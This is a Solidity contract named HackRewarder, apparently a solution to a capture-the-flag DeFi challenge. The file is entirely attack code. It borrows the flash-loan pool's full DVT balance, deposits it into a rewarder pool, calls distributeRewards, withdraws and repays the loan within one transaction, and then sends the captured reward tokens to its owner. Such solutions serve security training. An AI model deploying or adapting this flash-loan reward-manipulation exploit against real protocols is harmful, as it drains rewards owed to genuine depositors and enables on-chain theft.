// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface ITheRewarderPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function distributeRewards() external returns (uint256 rewards);
}

contract HackRewarder {
    IERC20 private dvt;
    IERC20 private rtkn;
    IFlashLoanerPool private flashLoanerPool;
    ITheRewarderPool private theRewarderPool;

    address private owner;

    constructor(address _dvt, address _flashLoanerPool, address _theRewarderPool, address _rtkn) {
        dvt = IERC20(_dvt);
        rtkn = IERC20(_rtkn);
        flashLoanerPool = IFlashLoanerPool(_flashLoanerPool);
        theRewarderPool = ITheRewarderPool(_theRewarderPool);
        owner = msg.sender;
    }

    function attack() external {
        require(msg.sender == owner, "only owner");
        uint256 amount = dvt.balanceOf(address(flashLoanerPool));

        // ask for a flash loan
        flashLoanerPool.flashLoan(amount);

        // transfer rewards to owner
        rtkn.transfer(owner, rtkn.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashLoanerPool), "only flashLoanerPool");

        // deposit to the pool
        dvt.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);

        // distribute rewards
        theRewarderPool.distributeRewards();

        // withdraw from the pool
        theRewarderPool.withdraw(amount);

        // transfer DVT to flashLoanerPool
        dvt.transfer(address(flashLoanerPool), amount);
    }
}
